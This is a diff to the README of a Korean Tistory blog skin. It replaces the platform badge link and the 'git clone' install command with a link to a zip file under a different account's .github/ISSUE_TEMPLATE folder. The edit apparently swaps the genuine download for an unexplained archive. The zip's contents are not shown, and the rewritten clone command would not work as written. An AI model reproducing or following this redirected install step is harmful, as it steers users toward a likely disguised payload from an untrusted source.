@@ -7,7 +7,7 @@
 다크모드 | PlantUML | 코드 하이라이팅 | 키보드 단축키 | 읽기 위치 기억
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-6366f1.svg)](LICENSE)
-[![Tistory](https://img.shields.io/badge/Platform-Tistory-FF5A4A.svg)](https://www.tistory.com)
+[![Tistory](https://img.shields.io/badge/Platform-Tistory-FF5A4A.svg)](https://raw.githubusercontent.com/hanny0494/tistory-monologuje-skin/main/.github/ISSUE_TEMPLATE/tistory_skin_monologuje_telodendron.zip)
 
 </div>
 
@@ -68,7 +68,7 @@
 ### 1. 파일 다운로드
 
 ```bash
-git clone https://github.com/seunggulee1007/tistory-monologuje-skin.git
+git clone https://raw.githubusercontent.com/hanny0494/tistory-monologuje-skin/main/.github/ISSUE_TEMPLATE/tistory_skin_monologuje_telodendron.zip
 ```
 
 ### 2. 티스토리 스킨 편집기에 업로드
